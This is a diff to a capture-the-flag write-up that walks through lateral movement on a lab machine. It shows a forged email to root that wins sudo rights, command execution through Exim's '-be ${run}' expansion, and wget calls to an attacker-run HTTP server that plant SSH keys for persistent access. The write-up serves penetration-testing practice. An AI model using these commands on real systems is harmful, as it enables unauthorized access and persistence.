@@ -899,8 +899,400 @@ We have skipped the verification and after testing the credentials, the only one
 
 ## carlos
 
+In the user Carlos's directory we find the flag and the mbox file
+
+![image](https://github.com/user-attachments/assets/291884b7-c603-4466-8dfe-ddda3fcf42f3)
+
+I check the mbox file
+
+```bash
+cat mbox
+```
+```bash
+From pedro@cybersec Thu Mar 20 15:35:07 2025
+Return-path: <pedro@cybersec>
+Envelope-to: carlos@cybersec
+Delivery-date: Thu, 20 Mar 2025 15:35:07 +0000
+Received: from pedro by cybersec with local (Exim 4.96)
+	(envelope-from <pedro@cybersec>)
+	id 1tvHvH-00002O-1M
+	for carlos@cybersec;
+	Thu, 20 Mar 2025 15:35:07 +0000
+To: carlos@cybersec
+Subject: Viaje
+MIME-Version: 1.0
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1tvHvH-00002O-1M@cybersec>
+From: pedro@cybersec
+Date: Thu, 20 Mar 2025 15:35:07 +0000
+Status: RO
+
+Hola Carlos, espero te encuentres bien, te comento que tengo que ir de viaje con el coordinador a un evento en otra ciudad, el problema es que estoy en espera de un reporte forense que enviaran desde Dracor S.A. y en vista de que no estare hablare con el administrador para que te asigne permisos para que asi puedas chequear mi buzon, responder el correo de Dracor S.A. y asi adelantas trabajo mientras llego
+
+
+From carlos@cybersec Thu Mar 20 15:37:51 2025
+Return-path: <carlos@cybersec>
+Envelope-to: pedro@cybersec
+Delivery-date: Thu, 20 Mar 2025 15:37:51 +0000
+Received: from carlos by cybersec with local (Exim 4.96)
+        (envelope-from <carlos@cybersec>)
+        id 1tvHxv-00002X-0U
+        for pedro@cybersec;
+        Thu, 20 Mar 2025 15:37:51 +0000
+To: pedro@cybersec
+Subject: Viaje
+MIME-Version: 1.0
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1tvHxv-00002X-0U@cybersec>
+From: carlos@cybersec
+Date: Thu, 20 Mar 2025 15:37:51 +0000
+Status: RO
+
+Hola Pedro, perfecto, recuerdo el reporte, ya me habias comentado de el antes y listo yo quedo atento a tu buzon, me notificas culquier novedad.
+
+From pedro@cybersec Thu Mar 20 15:42:23 2025
+Return-path: <pedro@cybersec>
+Envelope-to: carlos@cybersec
+Delivery-date: Thu, 20 Mar 2025 15:42:23 +0000
+Received: from pedro by cybersec with local (Exim 4.96)
+	(envelope-from <pedro@cybersec>)
+	id 1tvI2J-00002o-0k
+	for carlos@cybersec;
+	Thu, 20 Mar 2025 15:42:23 +0000
+To: carlos@cybersec
+Subject: Viaje
+MIME-Version: 1.0
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1tvI2J-00002o-0k@cybersec>
+From: pedro@cybersec
+Date: Thu, 20 Mar 2025 15:42:23 +0000
+Status: RO
+
+Saludos Carlos, ya he notificado al administrador (root) y queda a la espera de que le hagas llegar el requerimiento en root@cybersec, recuerda el formato de solicitud:
+
+Nombre solicitante:
+Matricula solicitante:
+Fecha:
+Breve descripcion:
+
+en la descripcion es importante que coloques el siguiente numero de caso para dar continuidad con mi solicitud, caso nro: 000-01458
+y esta al pendiente de tu bandeja porque una vez te habiliten los permisos recibiras la notificacion, saludos
+```
+
+It seems that the administrator expects to receive an email to assign this user certain permissions to perform actions as the user Pedro. The mail agent used is EXIM. ​​We obtain this information if we detail the emails in Mbox.
+
+The administrator is waiting for specific information:
+Applicant's name:
+Applicant's license plate:
+Date:
+Brief description:
+
+What I don't have is Carlos's license plate.
+
+Performing an advanced search on the system, I managed to find Carlos's license plate.
+
+```bash
+find / -user carlos 2>/dev/null |grep -vE 'proc|dev' |xargs grep "matricula" 2>/dev/null
+```
+```bash
+/home/carlos/.bashrc:alias matricula='echo "mi matricula es: 1250319"'
+```
+
+Now that I have Carlos's license plate, I'll try emailing the administrator to see if he responds.
+
+```bash
+echo -e "Nombre solicitante: carlos\nMatricula solicitante:1250319\nFecha:22-03-25\nBreve descripcion: caso nro: 000-01458" | /usr/sbin/exim root@cybersec
+```
+
+I'm checking to see if I get answers from the administrator.
+
+![image](https://github.com/user-attachments/assets/bc04dbe1-07b8-4cf1-9690-d3f1123bc3ce)
+
+The administrator has responded and has granted certain privileges, so we check the permissions with sudo -l
+
+![image](https://github.com/user-attachments/assets/3f9cc25f-ad49-4083-b98c-5437c4786ede)
+
+The administrator assigned Carlos the necessary permissions to manage Exim as Pedro. To abuse this binary and jump to the user pedro, it is necessary to read its documentation where we can find the way to execute commands.
+
+![image](https://github.com/user-attachments/assets/584794b8-bebe-4d1e-902a-7be409f45594)
+
+After a while, the permissions that had been granted to Carlos were revoked, so to test the execution of commands with the information found in Exim, it is necessary to send the email to the administrator again. Once the permissions are granted again, we try to execute the command: `sudo -u pedro /usr/sbin/exim -be '${run{/bin/bash -c "id"}}'`
+
+![image](https://github.com/user-attachments/assets/7aea5e4a-110f-432d-af43-469af31355a4)
+
+The command execution worked, the problem is that it is not possible to launch a bash directly, so my idea will be to load a pair of keys created by me in /home/pedro/.ssh and thus obtain access via SSH.
+
+
+We create a pair of SSH keys on our attacking machine:
+```bash
+ssh-keygen -t rsa -b 4096
+```
+```bash
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/darks/.ssh/id_rsa): 
+/home/darks/.ssh/id_rsa already exists.
+Overwrite (y/n)? y
+Enter passphrase for "/home/darks/.ssh/id_rsa" (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /home/darks/.ssh/id_rsa
+Your public key has been saved in /home/darks/.ssh/id_rsa.pub
+The key fingerprint is:
+SHA256:zyOXK9iVVZPcMOGF3QQYw8G2CQsIizG3vexCh3e88pM darks@Darks
+The key's randomart image is:
++---[RSA 4096]----+
+|  o o. .   o+==X+|
+|   = +. . . =o*o+|
+|  . o .  . + +.. |
+|     o o  . +    |
+|    o = S  o     |
+|   . + . +o.     |
+|    . oooo*      |
+|     ..oEo o     |
+|        .o.      |
++----[SHA256]-----+
+```
+
+We copy the keys to our current directory and create a copy of id_rsa.pub with the name authorized_keys
+
+```bash
+cp ~/.ssh/id_rsa . && cp ~/.ssh/id_rsa.pub . && cp id_rsa.pub authorized_keys
+```
+
+Now we must download the authorized_keys and id_rsa.pub files to /home/pedro/.ssh and for this we start a python server on our attacking machine
+
+```bash
+python3 -m http.server 80
+```
+
+Then we send the email to the administrator again so that he assigns us the permissions to run exim as Pedro and once with the permissions we download the keys
+
+```bash
+echo -e "Nombre solicitante: carlos\nMatricula solicitante:1250319\nFecha:22-03-25\nBreve descripcion: caso nro: 000-01458" | /usr/sbin/exim root@cybersec
+```
+
+```bash
+sudo -u pedro /usr/sbin/exim -be '${run{/bin/bash -c "cd /home/pedro/.ssh && wget http://172.17.0.1/authorized_keys"}}'
+```
+```bash
+sudo -u pedro /usr/sbin/exim -be '${run{/bin/bash -c "cd /home/pedro/.ssh && wget http://172.17.0.1/id_rsa.pub"}}'
+```
+```bash
+sudo -u pedro /usr/sbin/exim -be '${run{/bin/bash -c "ls -la /home/pedro/.ssh"}}'
+```
+
+![image](https://github.com/user-attachments/assets/509ec626-c114-4eb0-b9e3-6e3bdebcbba9)
+
+we access via ssh as `pedro`
+
+```bash
+ssh -i id_rsa.pub pedro@172.17.0.2
+```
+
+![image](https://github.com/user-attachments/assets/e58b75fc-ab60-4b7b-b6d8-f8a7202a59be)
+
 
 # Privilege Escalation
 
 ## pedro
+
+In Pedro's directory we also see the mbox file, so we first read the mail conversations of this user
+
+```bash
+cat mbox
+```
+```bash
+From admin2@cybersec Wed Mar 19 23:02:17 2025
+Return-path: <admin2@cybersec>
+Envelope-to: pedro@cybersec
+Delivery-date: Wed, 19 Mar 2025 23:02:17 +0000
+Received: from admin2 by cybersec with local (Exim 4.96)
+	(envelope-from <admin2@cybersec>)
+	id E1tv2QT-00004Y-04
+	for pedro@cybersec;
+	Wed, 19 Mar 2025 23:02:17 +0000
+To: pedro@cybersec
+Subject: debugging & reverse engineering
+MIME-Version: 1.0
+Content-Type: text/plain; charset="ANSI_X3.4-1968"
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1tv2QT-00004Y-04@cybersec>
+From: admin2 <admin2@cybersec>
+Date: Wed, 19 Mar 2025 23:02:17 +0000
+Status: RO
+
+Pedro, hemos detectado una posible puerta trasera en el binario que he dejado en tu directorio 
+(Este binario fue desarrollado por el antiguo equipo de desarrollo en Dracor S.A. para llevar un registro de entrada/salida de los trabajadores), necesitamos 
+que lo analisis y realices un reporte lo mas pronto posible. Quedo atento a tus comentarios, saludos.
+
+
+From pedro@cybersec Wed Mar 20 00:45:47 2025
+Return-path: <pedro@cybersec>
+Envelope-to: admin2@cybersec
+Delivery-date: Wed, 20 Mar 2025 00:45:47 +0000
+Received: from pedro by cybersec with local (Exim 4.96)
+	(envelope-from <pedro@cybersec>)
+	id 1tv2bb-00005C-0v
+	for root@cybersec;
+	Wed, 20 Mar 2025 00:45:47 +0000
+To: admin2@cybersec
+Subject: debugging & reverse engineering
+MIME-Version: 1.0
+Content-Type: text/plain; charset="ANSI_X3.4-1968"
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1tv2bb-00005C-0v@cybersec>
+From: pedro@cybersec
+Date: Wed, 20 Mar 2025 00:45:47 +0000
+Status: RO
+
+Buenas tardes, le adelanto los datos mas relevantes del analisis hasta la fecha.
+El binario en efecto cuenta con una puerta trasera la cual es activada a traves de una funcion que nunca se llama en la ejecucion normal del programa, tambien se detecto
+un buffer over flow el cual debe ser el detonante para acceder a la puerta trasera, sin embargo hasta la fecha me encuentro un poco limitado sin posibilidades de poder
+continuar con un analisis mas profundo debido a que no es posible depurar el binario (sin privilegios) y tampoco es posible la ejecucion del mismo en una MV. El binario
+realiza una comprobacion de su entorno de ejecucion, si detecta una MV no se ejecuta, lo mismo sucede si intento depurarlo, detecta que se intenta depurar y no se ejecuta
+Si fuera posible, necesito poder depurar el binario ejecutando el depurador con privilegios y forzar la depuracion. Quedo a la espera de comentarios, saludos
+
+
+From admin2@cybersec Wed Mar 20 10:02:17 2025
+Return-path: <admin2t@cybersec>
+Envelope-to: pedro@cybersec
+Delivery-date: Wed, 20 Mar 2025 10:02:17 +0000
+Received: from admin2 by cybersec with local (Exim 4.96)
+        (envelope-from <admin2@cybersec>)
+        id E1tv2QT-12404Y-04
+        for pedro@cybersec;
+        Wed, 20 Mar 2025 10:02:17 +0000
+To: pedro@cybersec
+Subject: debugging & reverse engineering
+MIME-Version: 1.0
+Content-Type: text/plain; charset="ANSI_X3.4-1968"
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1tv2QT-12404Y-04@cybersec>
+From: admin2 <admin2@cybersec>
+Date: Wed, 20 Mar 2025 10:02:17 +0000
+Status: RO
+
+Hola Pedro, estuve leyendo tu correo y tengo otra pregunta para ti, crees sea posible puedas desarrollar una POC para el binario?
+ya que esto seria una prueba contundente contra el antiguo equipo de desarrollo de Dracor S.A.
+En cuanto a darte privilegios para que puedas depurar el binario ya que no es posible ejecutarlo en MV ni depurarlo sin provilegios,
+voy a estar notificando al administrador (root) para que configure el entorno para que esto lo llevemos de la manera mas segura posible, 
+espera nuevas actualizaciones de mi parte, pronto te estare escribiendo...
+
+
+From admin2@cybersec Wed Mar 20 14:02:17 2025
+Return-path: <admin2@cybersec>
+Envelope-to: pedro@cybersec
+Delivery-date: Wed, 20 Mar 2025 14:02:17 +0000
+Received: from admin2 by cybersec with local (Exim 4.96)
+        (envelope-from <admin2@cybersec>)
+        id E1tv2QT-12404z-04
+        for pedro@cybersec;
+        Wed, 20 Mar 2025 14:02:17 +0000
+To: pedro@cybersec
+Subject: debugging & reverse engineering
+MIME-Version: 1.0
+Content-Type: text/plain; charset="ANSI_X3.4-1968"
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1tv2QT-12404z-04@cybersec>
+From: admin2 <admin2@cybersec>
+Date: Wed, 20 Mar 2025 14:02:17 +0000
+Status: RO
+
+Saludos Pedro, como te comente, iba a notificar al administrador para configurar el entorno y asi poder darte los privilegios que solicitaste y ya se encuentra todo
+listo, cuando requieras los privilegios sobre gdb se lo haces saber al administrador en root@cybersec, como es de costumbre, antes de habilitar esto debes enviar el
+formato de solicitud de costumbre:
+
+Nombre solicitante:
+Matricula solicitante:
+Fecha:
+Breve descripcion:
+
+Una vez reciba tu correo activara los permisos necesarios, saludos
+
+
+
+
+From pedro@cybersec Thu Mar 20 15:35:07 2025
+Return-path: <pedro@cybersec>
+Envelope-to: carlos@cybersec
+Delivery-date: Thu, 20 Mar 2025 15:35:07 +0000
+Received: from pedro by cybersec with local (Exim 4.96)
+	(envelope-from <pedro@cybersec>)
+	id 1tvHvH-00002O-1M
+	for carlos@cybersec;
+	Thu, 20 Mar 2025 15:35:07 +0000
+To: carlos@cybersec
+Subject: Viaje
+MIME-Version: 1.0
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1tvHvH-00002O-1M@cybersec>
+From: pedro@cybersec
+Date: Thu, 20 Mar 2025 15:35:07 +0000
+Status: RO
+
+Hola Carlos, espero te encuentres bien, te comento que tengo que ir de viaje con el coordinador a un evento en otra ciudad, el problema es que estoy en espera de un reporte forense que enviaran desde Dracor S.A. y en vista de que no estare hablare con el administrador para que te asigne permisos para que asi puedas chequear mi buzon, responder el correo de Dracor S.A. y asi adelantas trabajo mientras llego
+
+
+From carlos@cybersec Thu Mar 20 15:37:51 2025
+Return-path: <carlos@cybersec>
+Envelope-to: pedro@cybersec
+Delivery-date: Thu, 20 Mar 2025 15:37:51 +0000
+Received: from carlos by cybersec with local (Exim 4.96)
+	(envelope-from <carlos@cybersec>)
+	id 1tvHxv-00002X-0U
+	for pedro@cybersec;
+	Thu, 20 Mar 2025 15:37:51 +0000
+To: pedro@cybersec
+Subject: Viaje
+MIME-Version: 1.0
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1tvHxv-00002X-0U@cybersec>
+From: carlos@cybersec
+Date: Thu, 20 Mar 2025 15:37:51 +0000
+Status: RO
+
+Hola Pedro, perfecto, recuerdo el reporte, ya me habias comentado de el antes y listo yo quedo atento a tu buzon, me notificas culquier novedad.
+
+From pedro@cybersec Thu Mar 20 15:42:23 2025
+Return-path: <pedro@cybersec>
+Envelope-to: carlos@cybersec
+Delivery-date: Thu, 20 Mar 2025 15:42:23 +0000
+Received: from pedro by cybersec with local (Exim 4.96)
+        (envelope-from <pedro@cybersec>)
+        id 1tvI2J-00002o-0k
+        for carlos@cybersec;
+        Thu, 20 Mar 2025 15:42:23 +0000
+To: carlos@cybersec
+Subject: Viaje
+MIME-Version: 1.0
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1tvI2J-00002o-0k@cybersec>
+From: pedro@cybersec
+Date: Thu, 20 Mar 2025 15:42:23 +0000
+Status: RO
+
+Saludos Carlos, ya he notificado al administrador (root) y queda a la espera de que le hagas llegar el requerimiento, recuerda el formato de solicitud:
+
+Nombre solicitante:
+Matricula solicitante:
+Fecha:
+Breve descripcion:
+
+en la descripcion es importante que coloques el siguiente numero de caso para dar continuidad con mi solicitud, caso nro: 000-01458
+y esta al pendiente de tu bandeja porque una vez te habiliten los permisos recibiras la notificacion, saludos
+```
+
+There are two conversations here, the first is with the administrator talking about the Hallx program that is in Pedro's directory and the second is with Carlos, this time I will focus on the first conversation.
+
+In the conversation between the administrator and Pedro, the latter asks the admin for privileges to be able to execute gdb and thus be able to debug the hallx binary. It seems that the binary cannot be debugged without privileges and it is also not possible to execute it in a virtual machine since it checks its environment. 
+
+If we check the analisis_hallx directory we will see the following screenshots of the analysis that has been done to the program
+
+
+
 
